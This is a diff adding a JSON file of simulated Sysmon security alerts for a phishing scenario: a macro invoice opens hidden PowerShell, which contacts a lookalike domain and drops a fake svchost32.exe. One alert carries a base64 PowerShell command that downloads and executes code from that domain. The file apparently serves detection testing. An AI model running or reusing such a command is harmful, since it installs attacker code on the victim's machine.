@@ -1,0 +1,182 @@
+[
+  {
+    "id": "scn-phish-0001",
+    "timestamp": "2026-11-07T14:02:11.000+0000",
+    "rule": {
+      "id": "61613",
+      "level": 3,
+      "description": "Sysmon - File created in Outlook temporary folder.",
+      "groups": [
+        "windows",
+        "sysmon",
+        "sysmon_eid11_detections"
+      ],
+      "mitre": {
+        "id": [
+          "T1566.001"
+        ],
+        "technique": [
+          "Spearphishing Attachment"
+        ]
+      }
+    },
+    "agent": {
+      "id": "013",
+      "name": "DR-PATEL-LAPTOP",
+      "ip": "10.0.1.42"
+    },
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "11",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "computer": "DR-PATEL-LAPTOP"
+        },
+        "eventdata": {
+          "image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+          "targetFilename": "C:\\Users\\spatel\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\Q7ZK2M1B\\Invoice_Nov_2026.docm",
+          "user": "NORTHFIELD\\spatel"
+        }
+      }
+    },
+    "location": "EventChannel"
+  },
+  {
+    "id": "scn-phish-0002",
+    "timestamp": "2026-11-07T14:02:39.000+0000",
+    "rule": {
+      "id": "92052",
+      "level": 12,
+      "description": "Microsoft Word started PowerShell with an encoded command (macro).",
+      "groups": [
+        "windows",
+        "sysmon",
+        "sysmon_eid1_detections"
+      ],
+      "mitre": {
+        "id": [
+          "T1566.001",
+          "T1059.001"
+        ],
+        "technique": [
+          "Spearphishing Attachment",
+          "PowerShell"
+        ]
+      }
+    },
+    "agent": {
+      "id": "013",
+      "name": "DR-PATEL-LAPTOP",
+      "ip": "10.0.1.42"
+    },
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "1",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "computer": "DR-PATEL-LAPTOP"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "commandLine": "powershell.exe -nop -w hidden -enc aQBlAHgAKABpAHcAcgAgAG4AbwByAHQAaABmAGkAZQAxAGQALQBiAGkAbABsAGkAbgBnAC4AYwBvAG0ALwBhACkA",
+          "parentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "parentCommandLine": "\"WINWORD.EXE\" /n \"C:\\Users\\spatel\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\Q7ZK2M1B\\Invoice_Nov_2026.docm\"",
+          "user": "NORTHFIELD\\spatel",
+          "integrityLevel": "Medium"
+        }
+      }
+    },
+    "location": "EventChannel"
+  },
+  {
+    "id": "scn-phish-0003",
+    "timestamp": "2026-11-07T14:02:41.000+0000",
+    "rule": {
+      "id": "92101",
+      "level": 10,
+      "description": "PowerShell connected to an untrusted internet domain.",
+      "groups": [
+        "windows",
+        "sysmon",
+        "sysmon_eid3_detections"
+      ],
+      "mitre": {
+        "id": [
+          "T1105"
+        ],
+        "technique": [
+          "Ingress Tool Transfer"
+        ]
+      }
+    },
+    "agent": {
+      "id": "013",
+      "name": "DR-PATEL-LAPTOP",
+      "ip": "10.0.1.42"
+    },
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "3",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "computer": "DR-PATEL-LAPTOP"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "protocol": "tcp",
+          "destinationHostname": "northfie1d-billing.com",
+          "destinationPort": "80",
+          "sourceIp": "10.0.1.42",
+          "user": "NORTHFIELD\\spatel"
+        }
+      }
+    },
+    "location": "EventChannel"
+  },
+  {
+    "id": "scn-phish-0004",
+    "timestamp": "2026-11-07T14:02:47.000+0000",
+    "rule": {
+      "id": "92213",
+      "level": 13,
+      "description": "Executable dropped in AppData by PowerShell and started.",
+      "groups": [
+        "windows",
+        "sysmon",
+        "sysmon_eid1_detections"
+      ],
+      "mitre": {
+        "id": [
+          "T1204.002",
+          "T1036.005"
+        ],
+        "technique": [
+          "Malicious File",
+          "Match Legitimate Name or Location"
+        ]
+      }
+    },
+    "agent": {
+      "id": "013",
+      "name": "DR-PATEL-LAPTOP",
+      "ip": "10.0.1.42"
+    },
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "1",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "computer": "DR-PATEL-LAPTOP"
+        },
+        "eventdata": {
+          "image": "C:\\Users\\spatel\\AppData\\Roaming\\Microsoft\\svchost32.exe",
+          "commandLine": "C:\\Users\\spatel\\AppData\\Roaming\\Microsoft\\svchost32.exe -k netsvc",
+          "parentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "user": "NORTHFIELD\\spatel",
+          "integrityLevel": "Medium"
+        }
+      }
+    },
+    "location": "EventChannel"
+  }
+]
